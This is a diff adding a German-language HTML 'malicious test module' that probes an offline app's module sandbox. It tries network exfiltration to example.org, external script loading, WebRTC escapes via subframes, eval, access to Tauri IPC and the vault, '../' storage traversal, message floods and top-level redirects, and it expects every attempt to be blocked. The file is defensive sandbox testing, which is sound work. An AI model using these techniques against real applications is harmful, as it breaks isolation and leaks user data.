@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="de-AT">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bösartiges Testmodul</title>
+<style>
+  body { font: 15px/1.4 system-ui, sans-serif; margin: 12px; }
+  table { border-collapse: collapse; width: 100%; }
+  td { border-top: 1px solid #ccc; padding: 4px 6px; vertical-align: top; }
+  .gut { color: #176b2c; } .schlecht { color: #b00020; font-weight: 700; }
+</style>
+</head>
+<body>
+<!--
+  OFFLINE – bösartiges Testmodul (SICHERHEIT.md, Abschnitt Module; Auftrag Paket-Kit-Werkzeug, Phase C).
+  Versucht alles, was ein Modul nicht darf. Jeder Versuch muss scheitern. Ergebnis: Tabelle hier und
+  offline.speicher.schreiben("bericht", …), damit Test und App es von außen lesen können.
+  Dieses Modul besteht das Prüfprogramm absichtlich NICHT (Verbotsliste) und wird nie gebaut oder signiert.
+  Es wird nur über den Modulserver direkt geöffnet (werkzeug/sandbox-probe.mjs, oder in der Entwickler-App).
+-->
+<h1>Bösartiges Testmodul</h1>
+<p id="stand">läuft …</p>
+<table id="tabelle"></table>
+<script>
+"use strict";
+const ergebnisse = [];
+const verletzungen = [];
+document.addEventListener("securitypolicyviolation", (e) => verletzungen.push({ direktive: e.effectiveDirective || e.violatedDirective, url: String(e.blockedURI || "") }));
+const warte = (ms) => new Promise((r) => setTimeout(r, ms));
+const extern = "https://example.org/";
+
+/** Ein Versuch. `f` gibt true zurück, wenn der Angriff GELUNGEN ist, sonst false/wirft. */
+async function versuch(name, f, { direktive = null } = {}) {
+  const vorher = verletzungen.length;
+  let gelungen = false, text = "";
+  try {
+    const r = await Promise.race([f(), warte(3000).then(() => "zeit")]);
+    if (r === "zeit") { text = "keine Antwort (blockiert oder hängt)"; }
+    else { gelungen = r === true; text = gelungen ? "GELUNGEN" : String(r ?? "abgewiesen"); }
+  } catch (e) { text = `${e && e.name}: ${e && e.message}`.slice(0, 160); }
+  await warte(30);
+  const csp = verletzungen.slice(vorher).filter((v) => !direktive || String(v.direktive).startsWith(direktive));
+  if (csp.length) text += ` · CSP: ${csp[0].direktive}`;
+  ergebnisse.push({ name, blockiert: !gelungen, text });
+}
+
+/** Brücke direkt, am Modul-API vorbei – so wie ein Angreifer es täte. */
+function roh(nachricht, ms = 1500) {
+  return new Promise((ja) => {
+    const t = setTimeout(() => { removeEventListener("message", h); ja(null); }, ms);
+    function h(e) { if (e.source === parent && e.data && e.data.id === nachricht.id) { clearTimeout(t); removeEventListener("message", h); ja(e.data); } }
+    addEventListener("message", h);
+    parent.postMessage(nachricht, "*");
+  });
+}
+
+async function alles() {
+  // --- Netz ---
+  await versuch("fetch ins Internet", async () => { await fetch(extern); return true; }, { direktive: "connect-src" });
+  await versuch("fetch zum eigenen Server", async () => { await fetch(location.href); return true; }, { direktive: "connect-src" });
+  await versuch("XMLHttpRequest", () => new Promise((ja, nein) => { const x = new XMLHttpRequest(); x.onload = () => ja(true); x.onerror = () => nein(new Error("Fehler")); x.open("GET", extern); x.send(); }));
+  await versuch("WebSocket", () => new Promise((ja, nein) => { const w = new WebSocket("wss://example.org/"); w.onopen = () => ja(true); w.onerror = () => nein(new Error("Fehler")); }));
+  await versuch("EventSource", () => new Promise((ja, nein) => { const s = new EventSource(extern); s.onopen = () => ja(true); s.onerror = () => { s.close(); nein(new Error("Fehler")); }; }));
+  await versuch("sendBeacon", async () => { const vorher = verletzungen.length; const r = navigator.sendBeacon(extern, "daten"); await warte(300); return r === true && !verletzungen.slice(vorher).some((v) => /connect-src/.test(v.direktive)); }, { direktive: "connect-src" });
+  await versuch("Bild aus dem Internet", () => new Promise((ja, nein) => { const i = new Image(); i.onload = () => ja(true); i.onerror = () => nein(new Error("nicht geladen")); i.src = extern + "x.png?d=geheim"; }), { direktive: "img-src" });
+  await versuch("Skript aus dem Internet", () => new Promise((ja, nein) => { const s = document.createElement("script"); s.onload = () => ja(true); s.onerror = () => nein(new Error("nicht geladen")); s.src = extern + "x.js"; document.head.appendChild(s); }), { direktive: "script-src" });
+  await versuch("Stylesheet aus dem Internet", () => new Promise((ja, nein) => { const l = document.createElement("link"); l.rel = "stylesheet"; l.onload = () => ja(true); l.onerror = () => nein(new Error("nicht geladen")); l.href = extern + "x.css"; document.head.appendChild(l); }), { direktive: "style-src" });
+  await versuch("iframe ins Internet", () => new Promise((ja) => { const f = document.createElement("iframe"); f.onload = () => { try { ja(!!f.contentWindow.location.href && f.contentWindow.location.href !== "about:blank"); } catch { ja(false); } }; f.src = extern; document.body.appendChild(f); }), { direktive: "frame-src" });
+  await versuch("Worker", () => new Promise((ja, nein) => { const w = new Worker(URL.createObjectURL(new Blob(["postMessage(1)"], { type: "text/javascript" }))); w.onmessage = () => ja(true); w.onerror = () => nein(new Error("nicht gestartet")); }), { direktive: "worker-src" });
+  const stun = (P) => new Promise((ja, nein) => {
+    if (!P) return nein(new Error("nicht vorhanden"));
+    const pc = new P({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+    pc.createDataChannel("x");
+    pc.onicecandidate = (e) => { if (e.candidate && / srflx /.test(e.candidate.candidate)) ja(true); };
+    pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(nein);
+    setTimeout(() => nein(new Error("keine Verbindung nach außen")), 2500);
+  });
+  await versuch("WebRTC über leeren Unterrahmen", async () => {
+    const f = document.createElement("iframe"); document.body.appendChild(f);
+    const w = f.contentWindow; if (!w) throw new Error("kein Unterrahmen");
+    return stun(w.RTCPeerConnection || w.webkitRTCPeerConnection);
+  });
+  await versuch("WebRTC über srcdoc-Rahmen", async () => {
+    const f = document.createElement("iframe"); f.srcdoc = "<p>x</p>"; document.body.appendChild(f); await warte(200);
+    const w = f.contentWindow; return stun(w.RTCPeerConnection || w.webkitRTCPeerConnection);
+  });
+  await versuch("WebRTC (STUN ins Internet)", () => new Promise((ja, nein) => {
+    const P = window.RTCPeerConnection || window.webkitRTCPeerConnection;
+    if (!P) return nein(new Error("nicht vorhanden"));
+    const pc = new P({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+    pc.createDataChannel("x");
+    pc.onicecandidate = (e) => { if (e.candidate && / srflx /.test(e.candidate.candidate)) ja(true); };
+    pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(nein);
+    setTimeout(() => nein(new Error("keine Verbindung nach außen")), 2500);
+  }));
+
+  // --- Code nachladen ---
+  await versuch("eval", async () => eval("1 + 1") === 2, { direktive: "script-src" });
+  await versuch("new Function", async () => new Function("return 2")() === 2, { direktive: "script-src" });
+
+  // --- App, Tauri, Tresor ---
+  await versuch("parent.document lesen", async () => !!parent.document.body);
+  await versuch("parent.__TAURI__ / invoke", async () => { const t = parent.__TAURI__ || parent.__TAURI_INTERNALS__; return !!t; });
+  await versuch("eigenes __TAURI_INTERNALS__", async () => !!(window.__TAURI_INTERNALS__ || window.__TAURI__ || window.__TAURI_IPC__));
+  await versuch("WebView2-Kanal (chrome.webview)", async () => !!(window.chrome && window.chrome.webview && window.chrome.webview.postMessage));
+  await versuch("WebKit-Kanal (webkit.messageHandlers)", async () => !!(window.webkit && window.webkit.messageHandlers && Object.keys(window.webkit.messageHandlers).length));
+  await versuch("Tresor über ipc://", async () => { await fetch("ipc://localhost/tresor_notizen", { method: "POST", body: "{}" }); return true; }, { direktive: "connect-src" });
+  await versuch("Tresor über http://ipc.localhost", async () => { await fetch("http://ipc.localhost/tresor_notizen", { method: "POST", body: "{}" }); return true; }, { direktive: "connect-src" });
+  await versuch("Tresor über die Brücke", async () => { const a = await roh({ offline: 1, id: 9101, aufruf: "tresor.lesen", daten: {} }); return !!(a && a.ok); });
+
+  // --- Speicher ---
+  await versuch("localStorage", async () => { localStorage.setItem("x", "1"); return localStorage.getItem("x") === "1"; });
+  await versuch("indexedDB", () => new Promise((ja, nein) => { const r = indexedDB.open("x"); r.onsuccess = () => ja(true); r.onerror = () => nein(r.error); }));
+  await versuch("Cookies", async () => { document.cookie = "x=1"; return document.cookie.includes("x=1"); });
+  await versuch("Service Worker", async () => { await navigator.serviceWorker.register("sw.js"); return true; });
+  await versuch("fremder Speicher über Pfad (../)", async () => { const a = await roh({ offline: 1, id: 9102, aufruf: "speicher.lesen", daten: { schluessel: "../wir/tipps" } }); return !!(a && a.ok); });
+  await versuch("fremder Speicher über Modul-Feld", async () => {
+    await offline.speicher.schreiben("probe", "eigen");
+    const a = await roh({ offline: 1, id: 9103, modul: "wichteln", aufruf: "speicher.lesen", daten: { schluessel: "probe", modul: "wichteln" } });
+    return !!(a && a.ok && a.wert !== "eigen"); // gelungen nur, wenn etwas anderes als der eigene Wert kommt
+  });
+
+  // --- Brücke: unbekannt, zu groß, Flut ---
+  await versuch("unbekannter Aufruf", async () => { const a = await roh({ offline: 1, id: 9104, aufruf: "app.einstellungen", daten: {} }); return !!(a && a.ok); });
+  await versuch("Nachricht über 256 kB", async () => { const a = await roh({ offline: 1, id: 9105, aufruf: "speicher.schreiben", daten: { schluessel: "gross", wert: "x".repeat(300000) } }); return !!(a && a.ok); });
+  await versuch("Flut (300 Aufrufe auf einmal)", async () => {
+    let antworten = 0; const h = (e) => { if (e.source === parent && e.data && e.data.id >= 20000) antworten++; };
+    addEventListener("message", h);
+    for (let i = 0; i < 300; i++) parent.postMessage({ offline: 1, id: 20000 + i, aufruf: "speicher.lesen", daten: { schluessel: "probe" } }, "*");
+    await warte(1500); removeEventListener("message", h);
+    return antworten >= 300 ? true : `${antworten} von 300 beantwortet`;
+  });
+
+  // --- Fenster und Navigation ---
+  await versuch("window.open", async () => !!window.open(extern));
+  await versuch("top.location umleiten", async () => { top.location.href = extern; await warte(500); return true; });
+  await versuch("Zwischenablage lesen", async () => { const t = await navigator.clipboard.readText(); return typeof t === "string"; });
+  await versuch("Standort", () => new Promise((ja, nein) => navigator.geolocation.getCurrentPosition(() => ja(true), (e) => nein(new Error(e.message)))));
+}
+
+(async () => {
+  await alles();
+  const offen = ergebnisse.filter((e) => !e.blockiert);
+  const bericht = { zeit: new Date().toISOString(), agent: navigator.userAgent, versuche: ergebnisse.length, offen: offen.map((e) => e.name), ergebnisse, verletzungen: verletzungen.length };
+  document.getElementById("stand").textContent = offen.length ? `${offen.length} Angriff(e) GELUNGEN` : `alle ${ergebnisse.length} Angriffe blockiert`;
+  document.getElementById("stand").className = offen.length ? "schlecht" : "gut";
+  const t = document.getElementById("tabelle");
+  for (const e of ergebnisse) {
+    const tr = t.insertRow();
+    tr.insertCell().textContent = e.blockiert ? "✓" : "✗";
+    tr.insertCell().textContent = e.name;
+    tr.insertCell().textContent = e.text;
+    tr.className = e.blockiert ? "gut" : "schlecht";
+  }
+  try { await offline.speicher.schreiben("bericht", bericht); } catch (e) { document.getElementById("stand").textContent += " · Bericht nicht gespeichert: " + e.message; }
+  // Letzter Versuch, weil er bei Erfolg die Seite verlässt: Formular ins Internet
+  const f = document.createElement("form"); f.action = extern; f.method = "post";
+  const i = document.createElement("input"); i.name = "d"; i.value = "geheim"; f.appendChild(i); document.body.appendChild(f);
+  try { f.submit(); } catch {}
+})();
+</script>
+</body>
+</html>
